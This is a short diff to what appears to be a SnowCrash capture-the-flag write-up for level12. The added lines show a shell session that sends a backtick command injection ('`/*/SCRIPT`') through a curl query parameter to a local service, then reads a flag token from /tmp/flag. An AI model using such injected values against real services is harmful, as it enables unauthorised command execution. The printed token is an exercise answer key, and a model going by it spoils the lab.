@@ -24,6 +24,9 @@
     Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
     ```
 
-
+level12@SnowCrash:~$ curl localhost:4646/?x='`/*/SCRIPT`'
+..level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+level12@SnowCrash:~$ 
 
 
